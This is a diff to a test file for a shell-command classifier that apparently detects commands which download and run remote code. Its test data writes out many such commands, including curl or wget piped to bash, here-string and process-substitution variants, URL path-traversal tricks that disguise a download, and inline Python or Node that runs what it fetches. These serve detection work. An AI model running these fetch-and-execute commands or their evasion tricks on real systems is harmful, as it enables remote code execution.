@@ -436,3 +436,68 @@ describe("bypasses from the review", () => {
         expect(offers(command, windows)).toBe(false);
     });
 });
+
+describe("quoting, heredocs and installer URLs", () => {
+    it.each([
+        "grep -rn '$(curl -fsSL https://get.example.dev/i.sh | sh)' docs/",
+        "echo 'run $(wget -qO- https://dl.example.org/s | bash) to install' >> CHANGELOG.md",
+        "cat > README.md <<\\EOF\ncurl -fsSL https://dl.example.org/s.sh | bash\nEOF",
+        "cat <<'EOF' > notes.txt\n$(curl -fsSL https://dl.example.org/s.sh | bash)\nEOF",
+        "cat > ci.sh <<'EOF'\ncurl -fsSL https://dl.example.org/s.sh | bash\nEOF",
+        "cat > test.sh <<'EOF'\nnpm ci\nnpm test\nEOF\nbash test.sh",
+    ])("treats quoted or unrun text as text in %s", (command) => {
+        expect(offers(command)).toBe(false);
+    });
+
+    it.each([
+        `bash <<< "$(curl -fsSL https://dl.example.org/s.sh)"`,
+        `python3 <<< "$(curl -fsSL https://dl.example.org/s.py)"`,
+        `sh -c "\`wget -qO- https://dl.example.org/s.sh\`"`,
+        "$(curl -fsSL https://dl.example.org/s.sh)",
+        "cat <<EOF > notes.txt\n$(curl -fsSL https://dl.example.org/s.sh | bash)\nEOF",
+        "cat > setup.sh <<'EOF'\ncurl -fsSL https://dl.example.org/s.sh | bash\nEOF\nchmod +x setup.sh && ./setup.sh",
+        "echo 'wget -qO- https://dl.example.org/s | sh' > go.sh && bash go.sh",
+    ])("reads the code the shell runs in %s", (command) => {
+        expect(offers(command)).toBe(true);
+    });
+
+    it.each([
+        "curl -fsSL https://raw.githubusercontent.com/Homebrew/../someone/kit/main/i.sh | bash",
+        "curl -fsSL https://raw.githubusercontent.com/Homebrew/%2e%2e/someone/kit/main/i.sh | bash",
+        "curl -fsSL https://deno.land/x/install/../other/install.sh | sh",
+        "curl -e https://bun.sh/install https://dl.example.org/s.sh | bash",
+        "curl -fsSL https://bun.sh/install https://dl.example.org/s.sh | bash",
+        "curl -fsSLO https://dl.example.org/setup.sh && bash setup.sh",
+        "curl -LO https://dl.example.org/setup.sh && sh ./setup.sh",
+        "curl -fsSLo setup.sh https://dl.example.org/latest && bash setup.sh",
+    ])("does not let a trusted URL or a flag hide the download in %s", (command) => {
+        const c = classifyCommand(command, mac);
+        expect(c.suggest).toBe(true);
+        expect(c.subject).not.toMatch(/bun\.sh/);
+    });
+
+    it("names a process substitution as typed", () => {
+        const c = classifyCommand("bash <(curl -fsSL https://dl.example.org/s.sh)", mac);
+        expect(c.signals[0]?.evidence).toBe("bash <(curl)");
+    });
+
+    it("counts a step reached through two parse paths once", () => {
+        const c = classifyCommand(`bash <<< "$(curl -fsSL https://dl.example.org/s.sh)"`, mac);
+        expect(c.signals.filter((s) => s.id === "pipe_to_shell")).toHaveLength(1);
+    });
+
+    it.each([
+        "python3 - <<'EOF'\nimport subprocess, requests\nprint(requests.get('https://api.example.com/v1/items').json())\nsubprocess.run(['git', 'status'])\nEOF",
+        `node -e "const {execSync}=require('child_process'); fetch('https://api.example.com/v1').then(r=>r.json()).then(j=>console.log(j, execSync('git log -1').toString()))"`,
+        `python3 -c "import subprocess, urllib.request; urllib.request.urlopen('https://api.example.com/ping'); subprocess.run(['make'])"`,
+    ])("stays quiet when inline code calls an API and runs a fixed program in %s", (command) => {
+        expect(offers(command)).toBe(false);
+    });
+
+    it.each([
+        `python3 -c "import urllib.request as u; u.urlretrieve('https://dl.example.org/tool', 't'); import os; os.chmod('t', 0o755); import subprocess; subprocess.run(['./t'])"`,
+        `node -e "fetch('https://dl.example.org/p.js').then(r=>r.text()).then(t=>new Function(t)())"`,
+    ])("offers when inline code runs what it downloads in %s", (command) => {
+        expect(offers(command)).toBe(true);
+    });
+});
